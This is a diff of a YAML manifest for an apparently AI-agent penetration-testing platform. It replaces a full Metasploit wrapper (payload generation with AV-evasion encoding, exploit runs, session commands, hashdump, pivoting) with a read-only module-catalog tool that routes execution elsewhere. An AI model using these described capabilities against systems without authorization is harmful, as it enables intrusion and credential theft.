@@ -1,31 +1,27 @@
 name: metasploit
+kind: mcp
 version: "6.4"
-description: "Metasploit Framework v6.4 with persistent sessions via msfrpcd (RPC daemon) and the workspace database (PostgreSQL + msfdb auto-initialized at container start). 29 methods covering ~80–90% of msfconsole. Module surface: generate_payload, search_modules, module_info, check_vuln, run_exploit, exec_command, post_module, handler. Session surface: list_sessions, session_command, session_kill, session_upgrade. Job surface: list_jobs, stop_job. Pivoting: route_add/list/delete, portfwd_add/list/delete (executed through the meterpreter session API, not the shared console — Win7 SP1 verified live). Database surface: db_nmap, db_import, list_hosts, list_services, list_creds, list_loot, list_notes. Escape hatches: run_console (one msfconsole command) and run_resource_script (multi-line .rc script content). Sessions and jobs persist in msfrpcd between MCP calls. Container runs in service mode — single msfrpcd kept warm. All console/meterpreter operations are serialized through a server-side lock so concurrent agent calls don't trip over each other."
+description: "Rapid7's official Metasploit MCP server (msfmcpd) running against a per-engagement msfrpcd + Postgres database. Read-only surface — 8 tools for searching the module catalog and querying workspace database state (hosts, services, vulnerabilities, notes, credentials, loot). Returns structured JSON with pagination metadata. Sessions and exploit execution are NOT available through this tool — for that, use exploit-runner with public PoC scripts. Upstream (Rapid7) has stated that execution and session-interaction tools will land in a future iteration; we'll inherit them automatically when they ship."
+source: https://github.com/rapid7/metasploit-framework
 image: "ghcr.io/silicon-works/mcp-tools-metasploit:latest"
 image_size_mb: 3000
-timeout_seconds: 600
+timeout_seconds: 60
+idle_timeout_seconds: 600   # service-mode tool, ~30s cold-start cost; 10min keeps the bundle warm across an engagement turn
 
 service: true
 service_name: "metasploit"
 
 capabilities:
-  - payload_generation
-  - exploit_execution
-  - vulnerability_checking
   - module_search
-  - session_management
-  - credential_extraction
-  - lateral_movement
-  - network_pivoting
-  - port_forwarding
+  - module_metadata
   - workspace_database
-  - post_exploitation
-  - shell_to_meterpreter_upgrade
+  - vulnerability_lookup
+  - credential_lookup
+  - loot_inventory
 
 phases:
-  - enumeration       # auxiliary/scanner/* modules (smb_version, ftp_anonymous, etc.)
-  - exploitation      # primary use case
-  - post-exploitation # session_command, post_module, hashdump, pivoting
+  - enumeration       # query DB state populated by other tools (nmap, etc.)
+  - exploitation      # search for relevant modules / look up CVE → module mapping
 
 requirements:
   network: true
@@ -35,664 +31,210 @@ resources:
   memory_mb: 2048
   cpu: 1.0
 
+# Cross-tool routing hints — agents discover the catalog→execution
+# handoff pattern through these.
+see_also:
+  - tool: exploit-runner
+    reason: "Execution path. msfmcpd is read-only — once you've identified a module via msf_search_modules + msf_module_info, run the actual exploit through exploit-runner with a public PoC script (Python/shell)."
+  - tool: searchsploit
+    reason: "Broader exploit catalog (Exploit-DB) covering non-msf PoCs. metasploit's catalog is curated/maintained; searchsploit's is broad/historical. Use both when narrowing down a CVE — they don't fully overlap."
+  - tool: nmap
+    reason: "Populates the metasploit workspace database when scan results are imported via msfconsole's db_import. Without that, msf_host_info / msf_service_info / etc. return empty."
+  - tool: nuclei
+    reason: "Independent vulnerability validation. After msf_search_modules suggests a module is exploitable, nuclei templates can confirm the target's actually vulnerable before you commit to running the exploit."
+
+# Hard rules — surfaced separately from gotchas because these are "DO NOT
+# violate" rather than "expected behavior to be aware of."
+warnings:
+  - "READ-ONLY surface. This MCP cannot execute exploits, fire scanners, generate payloads, or interact with sessions. If you need to fire something, route through exploit-runner — never try to coerce a write operation through msfmcpd, it will return Unknown method."
+  - "DB-backed tools (5 of 6) require workspace='default' explicitly. Upstream marks workspace required despite having a default. Omitting it returns JSON-RPC -32602 'Missing required arguments: workspace'."
+  - "Rate limit: 60 req/min, burst 10. Tight loops (>10 calls in <10s) will fail the 11th+ call until the bucket refills. Pace catalog enumeration with ≥1s gaps."
+
+notes: |
+  Architecture: msfmcpd is a thin MCP-protocol layer over msfrpcd. The
+  container auto-spawns msfrpcd internally with random credentials at
+  startup, then translates incoming MCP tool calls into MessagePack-RPC
+  calls against the local msfrpcd. The DB tools query Postgres via the
+  framework's ActiveRecord layer.
+
+  Why this exists alongside exploit-runner: msfmcpd's value is the
+  CURATED MODULE CATALOG — ~2,300 maintained modules with structured
+  metadata (options, targets, references, reliability rankings). Looking
+  up a CVE → module mapping is much faster than searching ExploitDB +
+  reading PoC code. But upstream has not (yet) exposed module execution
+  through MCP, so the actual exploit run lives in exploit-runner.
+
+  Migration history (May 2026): replaces a 29-method Python wrapper that
+  duplicated msfconsole over pymetasploit3. The wrapper was retired once
+  Rapid7 shipped msfmcpd because (1) duplicating upstream's surface is
+  maintenance debt and (2) execution belongs in exploit-runner where it
+  unifies the attack-pattern across all tools (msf, public PoCs, custom
+  scripts). The wrapper is preserved at commit ad330f9 in case the
+  decision ever reverses.
+
+  Cold start: ~30s end-to-end (Postgres start + msfdb init + workspace
+  bootstrap + msfmcpd auto-spawn of msfrpcd + module index load).
+  ContainerManager's idle_timeout (set to 600s above) keeps the warm
+  container alive across multiple agent calls within an engagement.
+
 # Routing hints for tool selection. Triggers are REGEX patterns matched
-# against the agent's query (regex match → +35 score, the largest single
-# bonus). Use_for is substring-matched (+8). Phase match adds +0.15
-# multiplicative bonus when the agent's task phase matches our phases.
+# against the agent's query (regex match → +35 score). Use_for is
+# substring-matched (+8). Phase match adds +0.15 multiplicative bonus.
 routing:
   use_for:
-    - "run Metasploit exploit module against a target"
-    - "generate msfvenom payloads for reverse shells or meterpreter"
-    - "check if target is vulnerable with Metasploit scanner module"
-    - "manage meterpreter or shell sessions on exploited targets"
-    - "run post-exploitation modules for credential gathering"
-    - "set up multi/handler to catch reverse shell connections"
-    - "search for Metasploit modules by CVE or service name"
-    - "execute commands through exploit without full session"
-    - "pivot through a compromised host into an internal network"
-    - "set up port forwarding through a meterpreter session"
-    - "upgrade a shell session to meterpreter"
-    - "import nmap/nessus scan results into the metasploit workspace database"
-    - "dump SAM hashes from a compromised Windows host"
-    - "list active metasploit sessions, jobs, hosts, services, credentials, or loot"
-    - "run a multi-line msfconsole resource script for repeatable workflows"
-    - "execute arbitrary msfconsole commands when no named method covers the task"
+    - "search Metasploit modules by CVE, keyword, or module name"
+    - "look up which Metasploit module exploits a given CVE"
+    - "get detailed info / options / targets / references for a Metasploit module"
+    - "query workspace database for discovered hosts populated by other tools"
+    - "query workspace database for discovered services / open ports"
+    - "query workspace database for vulnerabilities flagged by msf scanners"
+    - "list credentials harvested into the metasploit workspace"
+    - "list loot files (SAM dumps, configs, screenshots) collected into the workspace"
+    - "list notes attached to hosts/services in the workspace"
   never_use_for:
-    - task: "port scanning networks (use the standalone nmap tool)"
+    - task: "execute an exploit module against a target"
+      use_instead: "exploit-runner"
+      reason: "msfmcpd is read-only; use exploit-runner with the module's public PoC script"
+    - task: "interact with an open meterpreter or shell session"
+      use_instead: "shell-session"
+      reason: "msfmcpd does not expose session command APIs"
+    - task: "generate a payload (msfvenom)"
+      use_instead: "exploit-runner"
+      reason: "wrap the msfvenom invocation in a script and run it through exploit-runner"
+    - task: "run an auxiliary scanner / check_vuln"
+      use_instead: "exploit-runner"
+      reason: "use the public PoC for the CVE; metasploit MCP cannot fire scanners"
+    - task: "port scanning"
       use_instead: "nmap"
-      reason: "metasploit's db_nmap exists but is for keeping msf workspace state in sync — for primary scans nmap is better"
-    - task: "directory enumeration / web fuzzing (use ffuf or feroxbuster)"
+    - task: "directory enumeration / web fuzzing"
       use_instead: "ffuf"
-    - task: "SQL injection (use sqlmap)"
+    - task: "SQL injection"
       use_instead: "sqlmap"
-    - task: "password brute force (use hydra)"
+    - task: "password brute force"
       use_instead: "hydra"
   # Triggers are matched as case-insensitive regex. Plain substrings work
-  # for most cases (case-insensitive substring match is automatic via the
-  # `i` flag). Use single-quotes to avoid yaml's double-quote escape rules.
+  # for most cases.
   triggers:
-    # Direct tool/component names — plain substrings
     - metasploit
     - msfconsole
-    - msfvenom
-    - msfrpcd
-    - meterpreter
-    - 'multi/handler'
-    # Module taxonomy
-    - 'exploit module'
-    - 'exploit framework'
+    - msfmcpd
+    - 'msf '
+    - 'msf module'
+    - 'metasploit module'
     - 'auxiliary module'
-    - 'auxiliary scanner'
+    - 'exploit module'
     - 'post module'
-    - 'post-exploitation'
-    - 'post exploitation'
-    # Payload concepts
-    - 'reverse shell'
-    - 'bind shell'
-    - reverse_tcp
-    - reverse_https
-    - bind_tcp
-    # CVE / advisory regex (matches MS17-010, MS08-067, etc.)
+    - 'CVE-\d{4}-\d{4,7}'
     - 'MS\d{2}-\d{3}'
-    # Well-known exploit names
     - EternalBlue
     - EternalRomance
     - BlueKeep
     - ZeroLogon
     - PrintNightmare
     - 'samba.*usermap'
-    - 'vsftpd.*backdoor'
-    # Pivoting concepts
-    - portfwd
-    - 'port forward'
-    - 'port forwarding'
-    # Credential extraction concepts
-    - hashdump
-    - kiwi
-    - mimikatz
+    - 'workspace database'
+    - 'msf workspace'
   prefer_over: []
 
 methods:
-  generate_payload:
-    description: "Generate a payload using msfvenom. Supports all Metasploit payloads (staged/stageless, meterpreter/shell) in multiple output formats (exe, elf, raw, python, php, asp, c, dll). Optional encoding with x86/shikata_ga_nai or other encoders for AV evasion. Returns the payload as base64."
-    when_to_use: "When you need a compiled payload binary for delivery to a target. Common payloads: 'windows/meterpreter/reverse_tcp' (staged Windows meterpreter), 'linux/x64/shell_reverse_tcp' (stageless Linux reverse shell), 'php/meterpreter/reverse_tcp' (PHP web shell). After generating, use handler to start a listener, then deliver the payload to the target. For simple text-based reverse shells (bash, python one-liners), use payload tool's revshell or exploit-runner's generate_payload instead."
-    params:
-      payload:
-        type: string
-        required: true
-        description: "Payload name (e.g., 'windows/meterpreter/reverse_tcp') or shortcut"
-      lhost:
-        type: string
-        required: true
-        description: "Listening host IP for reverse connections"
-      lport:
-        type: integer
-        required: true
-        description: "Listening port for reverse connections"
-      format:
-        type: string
-        default: "raw"
-        description: "Output format: exe, elf, raw, python, php, asp, c, dll, etc."
-      encoder:
-        type: string
-        description: "Encoder to use (e.g., 'x86/shikata_ga_nai')"
-      iterations:
-        type: integer
-        default: 1
-        description: "Number of encoding iterations"
-    returns:
-      payload_base64:
-        type: string
-        description: "Base64 encoded payload"
-      size_bytes:
-        type: integer
-        description: "Payload size in bytes"
-
-  search_modules:
-    description: "Search for Metasploit modules via the structured module.search RPC. Returns typed records (no console parsing)."
-    when_to_use: "To find exploits or auxiliary modules for a specific vulnerability or service"
+  msf_search_modules:
+    description: "Search the Metasploit module catalog by keyword, CVE, or module name. Full-text matching across module name, description, and references. Returns a paginated list of matches with type/name/fullname/rank/disclosure_date."
+    when_to_use: "Map a CVE or vulnerability description to one or more Metasploit module paths. Common queries: 'CVE-2017-0144', 'eternalblue', 'samba usermap', 'apache struts'. After identifying a module, call msf_module_info for full options + targets, then run the actual exploit via exploit-runner with the public PoC."
     params:
       query:
         type: string
         required: true
-        description: "Search query (e.g., 'ms17-010', 'apache struts', 'smb')"
+        description: "Search terms (keywords, module path fragment, CVE, advisory ID). 1–500 characters."
+      limit:
+        type: integer
+        default: 100
+        description: "Max results (1-1000)"
+      offset:
+        type: integer
+        default: 0
+        description: "Pagination offset"
+    returns:
+      metadata:
+        type: object
+        description: "{query, query_time, total_items, returned_items, limit, offset}"
+      data:
+        type: array
+        description: "Matching modules — each record has {fullname, type, name, rank, disclosure_date}"
+
+  msf_module_info:
+    description: "Return detailed metadata for a single Metasploit module — description, options (with type/required/default/desc/enums), targets, references, authors, has_check_method, default action, etc. No execution."
+    when_to_use: "After msf_search_modules narrows down a module path, call this to discover what RHOSTS/LHOST/payload/target options it accepts. Avoids agent trial-and-error guessing option names. Useful before writing a PoC script for exploit-runner."
+    params:
       type:
         type: enum
-        values: [all, exploit, auxiliary, post, payload]
-        default: all
-        description: "Module type to search for"
-      limit:
-        type: integer
-        default: 100
-        description: "Max results (1-1000)"
-      offset:
-        type: integer
-        default: 0
-        description: "Pagination offset"
-    returns:
-      modules:
-        type: array
-        description: "Matching modules — each record has type, name, fullname, rank, disclosure_date, check"
-      count:
-        type: integer
-        description: "Number of records on this page"
-      total_items:
-        type: integer
-        description: "Total matches before pagination"
-
-  check_vuln:
-    description: "Check if a target is vulnerable using an auxiliary scanner module"
-    when_to_use: "To verify if a target is vulnerable before attempting exploitation"
-    params:
-      module:
-        type: string
+        values: [exploit, auxiliary, post, payload, encoder, nop]
         required: true
-        description: "Auxiliary module path (e.g., 'auxiliary/scanner/smb/smb_ms17_010')"
-      rhosts:
-        type: string
-        required: true
-        description: "Target host(s)"
-      options:
-        type: object
-        description: "Additional module options as key-value pairs"
-      timeout:
-        type: integer
-        default: 120
-        description: "Timeout in seconds"
-    returns:
-      vulnerable:
-        type: boolean
-        description: "Whether target appears vulnerable"
-
-  run_exploit:
-    description: "Run an exploit module via the structured module.execute RPC. Sets RHOSTS / payload / LHOST / LPORT and any additional options through the module object's runopts, then queues the exploit as a background job. Polls sessions.list (NOT console output) until a new session appears or session_wait_seconds elapses. Returns the structured session set, plus job_id/uuid from the RPC. Bad option names raise ValidationError upfront. Bad payload-target combos are rejected by the RPC's compatibility check before submission."
-    when_to_use: "To exploit a confirmed vulnerability with a Metasploit module. Always run check_vuln first when available. Common exploit workflow: search_modules('ms17-010') → check_vuln with the auxiliary module → run_exploit with the exploit module. Provide lhost/lport for reverse payloads. Sessions opened by successful exploits persist in msfrpcd and can be accessed later via session_command."
-    params:
-      module:
-        type: string
-        required: true
-        description: "Exploit module path (e.g., 'exploit/windows/smb/ms17_010_eternalblue')"
-      rhosts:
-        type: string
-        required: true
-        description: "Target host(s)"
-      payload:
-        type: string
-        description: "Payload to use"
-      lhost:
-        type: string
-        description: "Listening host for reverse payloads"
-      lport:
-        type: integer
-        description: "Listening port for reverse payloads"
-      options:
-        type: object
-        description: "Additional module options"
-      timeout:
-        type: integer
-        default: 300
-        description: "Timeout in seconds"
-      disable_payload_handler:
-        type: boolean
-        default: false
-        description: "If true, sets DisablePayloadHandler=true so the exploit does NOT start its own implicit handler. Use this when you've already started a separate handler() for the same payload — otherwise the exploit's internal handler tries to bind the same LPORT and fails with 'Handler failed to bind'."
-      session_wait_seconds:
-        type: integer
-        default: 30
-        description: "How long to poll for new sessions after exploit submission. Async exploits (typical for reverse-payload modules) can take 30-60+ seconds to actually create a session; the `exploit -j` console output returns synchronously when the JOB is queued, not when the exploit completes (May 2026 fix — was previously reporting success too early)."
-    returns:
-      exploit_success:
-        type: boolean
-        description: "True iff a new session appeared during the poll window. No console string-matching — purely a delta on sessions.list."
-      sessions:
-        type: array
-        description: "New sessions opened (id, type, info, via_exploit, tunnel_peer)"
-      session_count:
-        type: integer
-        description: "Number of new sessions opened"
-      job_id:
-        type: integer
-        description: "Background job id returned by module.execute RPC"
-      uuid:
-        type: string
-        description: "Module run uuid returned by module.execute RPC"
-
-  exec_command:
-    description: "Execute a command on target using an exploit with cmd/unix/generic payload"
-    when_to_use: "For command execution exploits without needing a full session"
-    params:
-      module:
-        type: string
-        required: true
-        description: "Exploit module path that supports command execution"
-      rhosts:
-        type: string
-        required: true
-        description: "Target host(s)"
-      command:
-        type: string
-        required: true
-        description: "Command to execute on the target"
-      options:
-        type: object
-        description: "Additional module options (e.g., RPORT, TARGETURI)"
-      timeout:
-        type: integer
-        default: 120
-        description: "Timeout in seconds"
-    returns:
-      exploit_success:
-        type: boolean
-        description: "Whether exploit succeeded"
-      command_output:
-        type: string
-        description: "Output from executed command"
-
-  list_sessions:
-    description: "List active Meterpreter/shell sessions"
-    when_to_use: "To check for established sessions from previous exploits"
-    params:
-      timeout:
-        type: integer
-        default: 30
-        description: "Timeout in seconds"
-      limit:
-        type: integer
-        default: 100
-      offset:
-        type: integer
-        default: 0
-    returns:
-      sessions:
-        type: array
-        description: "Active sessions with id, type, info, tunnel_local, tunnel_peer, via_exploit, via_payload, platform, arch"
-      count:
-        type: integer
-        description: "Number of session records on this page"
-      total_items:
-        type: integer
-
-  session_command:
-    description: "Run a command in an active session"
-    when_to_use: "To execute commands in an established Meterpreter/shell session"
-    params:
-      session_id:
-        type: integer
-        required: true
-        description: "Session ID to interact with"
-      command:
-        type: string
-        required: true
-        description: "Command to execute in the session"
-      timeout:
-        type: integer
-        default: 60
-        description: "Timeout in seconds"
-    returns:
-      session_id:
-        type: integer
-        description: "Session ID used"
-      command:
-        type: string
-        description: "Command executed"
-      output:
-        type: string
-        description: "Output from the command"
-
-  post_module:
-    description: "Run a post-exploitation module on a session via msfrpcd console. KNOWN LIMITATION: post modules that call create_credential (post/windows/gather/hashdump, smart_hashdump, post/multi/gather/credentials/*, mimikatz_dynwrapx) trigger an ActiveRecord 'Session can't be blank' error during DB write — verified live on Blue, Win7 SP1, meterpreter session — and halt before hashes reach the agent. Workaround: for credential extraction, call session_command(session_id, 'hashdump') instead — runs hashdump as a meterpreter built-in, no DB write, returns full SAM dump. Non-credential modules (enum_logged_on_users, enum_shares, gather/checkvm, gather/dumplinks, recon/*) work fine through this path."
-    when_to_use: "For post-exploitation tasks (enum_logged_on_users, enum_shares, dumplinks). For credential extraction (hashdump, smart_hashdump, etc.) prefer session_command with the meterpreter built-in equivalent — see description for the AR/DB limitation."
-    params:
-      module:
-        type: string
-        required: true
-        description: "Post module path (e.g., 'post/multi/gather/env', 'post/windows/gather/enum_logged_on_users')"
-      session_id:
-        type: integer
-        required: true
-        description: "Session ID to run the module on"
-      options:
-        type: object
-        description: "Additional module options"
-      timeout:
-        type: integer
-        default: 120
-        description: "Timeout in seconds"
-    returns:
-      module:
-        type: string
-        description: "Module executed"
-      session_id:
-        type: integer
-        description: "Session ID used"
-
-  handler:
-    description: "Start a multi/handler to catch reverse shells. Handler runs as a background job in msfrpcd; persists across MCP calls until manually stopped or container restart."
-    when_to_use: "To set up a persistent listener for reverse shell payloads. Always START the handler BEFORE delivering the payload — otherwise the callback fails with no listener. For multiple expected sessions (mass payload delivery), keep exit_on_session=false (default). For single-shot exploitation, set exit_on_session=true so the handler self-cleans after first connect."
-    params:
-      payload:
-        type: string
-        required: true
-        description: "Payload to listen for (e.g., 'windows_reverse_tcp' shortcut or 'windows/x64/meterpreter/reverse_tcp' full)"
-      lhost:
-        type: string
-        required: true
-        description: "Listening host IP — your attacker IP (typically tun0)"
-      lport:
-        type: integer
-        required: true
-        description: "Listening port — must match LPORT in the payload you delivered"
-      timeout:
-        type: integer
-        default: 300
-        description: "Timeout waiting for connection (seconds)"
-      exit_on_session:
-        type: boolean
-        default: false
-        description: "If true, handler EXITS after first session connects (single-shot). If false (default), handler stays running for multiple sessions. Maps directly to msfconsole's ExitOnSession option."
-    returns:
-      payload:
-        type: string
-        description: "Payload type (resolved if shortcut)"
-      lhost:
-        type: string
-        description: "Listening host"
-      lport:
-        type: integer
-        description: "Listening port"
-      handler_started:
-        type: boolean
-        description: "True if msfrpcd registered the job in jobs.list (post-call verified) OR fallback markers in raw output indicate a successful bind"
-      job_id:
-        type: string
-        description: "Background job ID extracted from console output ('Exploit running as background job N')"
-      registered_job:
-        type: object
-        description: "The jobs.list entry for this handler (set when verified via the post-call poll)"
-
-  # ── May 2026 expansion (Wave 2-5): job/session/route/portfwd/db/escape ──
-
-  list_jobs:
-    description: "List active background jobs (handlers, listeners, exploit -j submissions). Maps to msfconsole `jobs -l`."
-    when_to_use: "After starting handlers or running exploits, to enumerate active jobs. Use stop_job to clean up."
-    params:
-      limit:
-        type: integer
-        default: 100
-      offset:
-        type: integer
-        default: 0
-    returns:
-      jobs:
-        type: array
-        description: "Active jobs (id, name, ...)"
-      count:
-        type: integer
-        description: "Number of job records on this page"
-      total_items:
-        type: integer
-
-  stop_job:
-    description: "Stop a background job. Maps to msfconsole `jobs -k <id>` or `jobs -K`. Returns `stopped` boolean — verified post-call by polling jobs.list."
-    when_to_use: "After a handler is no longer needed, or to clean up before starting a new one on the same LPORT (avoids 'Handler failed to bind' from port collision)."
-    params:
-      job_id:
-        type: integer
-        description: "Specific job ID to stop (from list_jobs)"
-      all_jobs:
-        type: boolean
-        default: false
-        description: "If true, stop all running jobs (jobs -K)"
-    returns:
-      stopped_job_id:
-        type: integer
-        description: "Job ID that was stopped (set when job_id was passed)"
-      stopped:
-        type: boolean
-        description: "True if the specific job is no longer in jobs.list after the kill"
-      stopped_all:
-        type: boolean
-        description: "True when all_jobs=True was passed"
-      remaining_jobs:
-        type: integer
-        description: "Number of jobs still listed after `jobs -K` (0 means all stopped)"
-
-  session_kill:
-    description: "Kill a session. Maps to msfconsole `sessions -k <id>` or `sessions -K`. Returns `killed` boolean — verified by polling sessions.list (msfrpcd's session reap is async, can take ~1s after the kill command returns)."
-    when_to_use: "When a session is stale or done. Important for engagement hygiene — leaving stale meterpreter sessions can confuse later operations."
-    params:
-      session_id:
-        type: integer
-        description: "Specific session ID to kill (from list_sessions)"
-      all_sessions:
-        type: boolean
-        default: false
-        description: "If true, kill all sessions (sessions -K)"
-    returns:
-      session_id:
-        type: integer
-      all_sessions:
-        type: boolean
-      killed:
-        type: boolean
-        description: "True if session is no longer in sessions.list after up to 3s of polling"
-
-  session_upgrade:
-    description: "Upgrade a shell session to meterpreter. Maps to msfconsole `sessions -u <id>` (runs post/multi/manage/shell_to_meterpreter under the hood). Critical workflow — most exploits return shells; many post modules need meterpreter. Polls up to 30s for the new session and probes it with `getuid` to confirm responsiveness so the agent doesn't get a zombie meterpreter ID."
-    when_to_use: "When you have a shell session but need meterpreter capabilities (most post/windows/gather/* modules require meterpreter). Returns the NEW meterpreter session ID after polling + probing."
-    params:
-      session_id:
-        type: integer
-        required: true
-        description: "Existing shell session ID to upgrade"
-      lhost:
-        type: string
-        description: "Listening host for the new meterpreter callback (defaults to msf's setg LHOST)"
-      lport:
-        type: integer
-        description: "Listening port for the new meterpreter callback"
-      timeout:
-        type: integer
-        default: 180
-        description: "How long to wait for the upgrade + new meterpreter session to appear"
-    returns:
-      shell_session_id:
-        type: integer
-        description: "Original shell session ID"
-      meterpreter_session_id:
-        type: integer
-        description: "New meterpreter session ID (null if upgrade failed)"
-      upgrade_success:
-        type: boolean
-        description: "True if a new meterpreter session appeared in sessions.list"
-      session_responsive:
-        type: boolean
-        description: "True if `getuid` against the new session returned non-empty output (proves the channel is live, not just registered)"
-
-  module_info:
-    description: "Return structured module metadata via the module.info + module.options RPCs — name, description, rank, references, targets, options (with required/default/desc/enums per option). No console parsing. A bad module path is rejected upfront with ValidationError instead of silently falling back to the previous module's info."
-    when_to_use: "Before run_exploit / check_vuln / post_module, to discover what options the module accepts (RHOSTS, SMBUser, TARGET, etc.). Avoids agent trial-and-error on option names."
-    params:
-      module:
-        type: string
-        required: true
-        description: "Module path including type prefix (e.g., 'exploit/windows/smb/ms17_010_eternalblue')"
-    returns:
-      module:
-        type: string
-      type:
-        type: string
-        description: "exploit / auxiliary / post / payload / encoder / nop / evasion"
+        description: "Module type"
       name:
         type: string
-      description:
-        type: string
-      rank:
-        type: string
-      references:
-        type: array
-      targets:
-        type: array
-      options:
+        required: true
+        description: "Module path WITHOUT the type prefix (e.g. 'windows/smb/ms17_010_eternalblue', not 'exploit/windows/smb/ms17_010_eternalblue'). 1–500 characters."
+    returns:
+      metadata:
         type: object
-        description: "Map of option name → {type, required, advanced, evasion, default, desc, enums}"
-      required_options:
-        type: array
-        description: "List of option names that are required to run the module"
+        description: "{query_time}"
+      data:
+        type: object
+        description: "{type, name, fullname, rank, disclosure_date, description, license, filepath, architectures, platforms, authors, privileged, has_check_method, default_options, references, targets, default_target, stance, actions, default_action, options}"
 
-  route_add:
-    description: "Add a route through a session for pivoting into a network reachable by the compromised host. Maps to msfconsole `route add <subnet> <netmask> <session>`. Returns route_added boolean — verified by re-querying route print after — so the agent doesn't need to interpret msfconsole's cosmetic 'Invalid :session' warning."
-    when_to_use: "When you've compromised a host with access to an internal network you want to scan/exploit further. Subsequent metasploit modules that target IPs in this subnet automatically route through the session."
+  msf_host_info:
+    description: "Query hosts in the metasploit workspace database. Hosts are populated by db_nmap, db_import, or successful module runs against discovered targets."
+    when_to_use: "Inventory check — what hosts has msf seen during the engagement, what's their inferred OS / state. Useful after the recon phase has imported scan data."
     params:
-      subnet:
+      workspace:
         type: string
-        required: true
-        description: "Subnet to route (e.g., '10.10.20.0')"
-      netmask:
+        default: "default"
+        description: "Workspace name (alphanumeric + underscore/hyphen)"
+      addresses:
         type: string
-        required: true
-        description: "Netmask (e.g., '255.255.255.0' or '/24')"
-      session_id:
-        type: integer
-        required: true
-        description: "Session ID to route through"
-    returns:
-      route_added:
+        description: "Filter by IP or CIDR (e.g. '192.168.1.0/24')"
+      only_up:
         type: boolean
-        description: "True if route appears in route print after the add (post-call verification)"
-
-  route_list:
-    description: "List active routes. Returns parsed route rows + raw output. Maps to msfconsole `route print`."
-    when_to_use: "After route_add, to confirm. Or to check routing state mid-engagement."
-    params: {}
-    returns:
-      routes:
-        type: array
-        description: "Parsed route rows (Subnet, Netmask, Gateway)"
-      count:
-        type: integer
-
-  route_delete:
-    description: "Delete a route. Maps to msfconsole `route remove <subnet> <netmask> <session_id>`. session_id is REQUIRED in msfconsole 6.4 (passing only subnet+netmask returns 'Missing arguments'). Returns route_removed boolean — verified by re-querying route print so the agent doesn't need to interpret msfconsole's cosmetic 'Invalid :session' warning."
-    when_to_use: "When the underlying session is gone or you want to redirect traffic differently."
-    params:
-      subnet:
-        type: string
-        required: true
-        description: "Subnet to delete (e.g., '10.129.200.0')"
-      netmask:
-        type: string
-        required: true
-        description: "Netmask (e.g., '255.255.255.0')"
-      session_id:
-        type: integer
-        required: true
-        description: "Meterpreter session ID the route was bound to. Required by msfconsole 6.4."
-    returns:
-      route_removed:
-        type: boolean
-        description: "True if subnet no longer appears in route print after the remove (post-call verification)"
-
-  portfwd_add:
-    description: "Set up local-to-remote port forwarding through a meterpreter session. Maps to meterpreter `portfwd add -l <local> -p <remote_port> -r <remote_host>`. Local-bind on attacker, traffic proxied through session to remote_host:remote_port. Useful for using non-msf tools (impacket, ssh, curl) against pivoted internal hosts."
-    when_to_use: "When you need to access a service on an internal host from your attacker box (where direct routing isn't enough — e.g., you want to use impacket-secretsdump from outside the meterpreter session). After portfwd_add, connect to localhost:local_port from your attacker tools."
-    params:
-      session_id:
-        type: integer
-        required: true
-        description: "Meterpreter session ID (must be a meterpreter, not a shell)"
-      local_port:
-        type: integer
-        required: true
-        description: "Local port on attacker side that will forward"
-      remote_host:
-        type: string
-        required: true
-        description: "Remote host reachable from the meterpreter session"
-      remote_port:
-        type: integer
-        required: true
-        description: "Remote port on remote_host"
-
-  portfwd_list:
-    description: "List active port forwards in a meterpreter session. Returns parsed forward rows + raw output. Maps to meterpreter `portfwd list`."
-    params:
-      session_id:
-        type: integer
-        required: true
-    returns:
-      forwards:
-        type: array
-        description: "Parsed forward rows (Index, Local, Remote, Direction)"
-      count:
-        type: integer
-
-  portfwd_delete:
-    description: "Delete a port forward. Maps to meterpreter `portfwd delete -l <local>`."
-    params:
-      session_id:
-        type: integer
-        required: true
-      local_port:
-        type: integer
-        required: true
-
-  db_nmap:
-    description: "Run nmap inside msfconsole — scan results auto-import into the workspace database. Maps to msfconsole `db_nmap <args>`. Requires DB-enabled msfrpcd (entrypoint enables postgres + msfdb init since May 2026)."
-    when_to_use: "Bridge between enum phase and msf state. Output is regular nmap output PLUS hosts/services get added to the workspace DB so subsequent metasploit modules see them via list_hosts / list_services. For external nmap usage prefer the standalone nmap kind:cli tool — db_nmap is for keeping msf's view in sync."
-    params:
-      args:
-        type: string
-        required: true
-        description: "nmap command-line arguments. Example: '-sV -p 22,80,445 10.10.10.40'"
-      timeout:
-        type: integer
-        default: 600
-        description: "Timeout in seconds (large scans can take a while)"
-
-  db_import:
-    description: "Import scan data from a file (nmap XML, nessus, openvas, etc.) into the workspace DB. Maps to msfconsole `db_import <path>`. Requires DB-enabled msfrpcd."
-    when_to_use: "After running an external scanner whose output you want to bring into msf's workspace state. Common: import nmap XML produced by the standalone nmap kind:cli tool."
-    params:
-      file_path:
-        type: string
-        required: true
-        description: "Path to scan file inside the container (use /session/output/<file> for files written from outside)"
-
-  list_hosts:
-    description: "List hosts via the structured db.hosts RPC. Records come back already-typed (address, mac, name, os_name, os_flavor, os_sp, purpose, info, comments). Populated by run_exploit, db_import, db_nmap."
-    when_to_use: "Query workspace state — what hosts has msf seen during this engagement. Useful before pivoting decisions."
-    params:
-      address:
-        type: string
-        description: "Filter to a specific address"
+        default: false
+        description: "Only return hosts marked alive"
       limit:
         type: integer
         default: 100
-        description: "Max results (1-1000)"
       offset:
         type: integer
         default: 0
-        description: "Pagination offset"
     returns:
-      hosts:
+      metadata:
+        type: object
+      data:
         type: array
-        description: "Host records on this page"
-      count:
-        type: integer
-      total_items:
-        type: integer
+        description: "Host records (address, mac, name, os_name, os_flavor, os_sp, purpose, info, …)"
 
-  list_services:
-    description: "List services via the structured db.services RPC. Records come back already-typed (host, port, proto, name, state, info). Populated by db_nmap, auxiliary scanners."
-    when_to_use: "Query discovered services — what's open and what version on each host."
+  msf_service_info:
+    description: "Query services discovered on hosts in the workspace database. Populated by db_nmap, auxiliary scanners, or successful module enumeration."
+    when_to_use: "Find what's open on which host — service inventory. Filter by host/port/protocol/name when narrowing down."
     params:
+      workspace:
+        type: string
+        required: true
+        default: "default"
+        description: "Workspace name. Upstream marks this required even though it has a default — always pass 'default' unless you've explicitly created another workspace."
+      names:
+        type: string
+        description: "Comma-separated service names to filter (e.g. 'http' or 'ldap,ssh')"
       host:
         type: string
-        description: "Filter to a specific host address"
-      port:
-        type: integer
-        description: "Filter to a specific port"
+        description: "Filter by host IP"
+      ports:
+        type: string
+        description: "Port or range (e.g. '80,443' or '1-1024')"
+      protocol:
+        type: enum
+        values: [tcp, udp]
+        description: "Protocol filter"
+      only_up:
+        type: boolean
+        default: false
       limit:
         type: integer
         default: 100
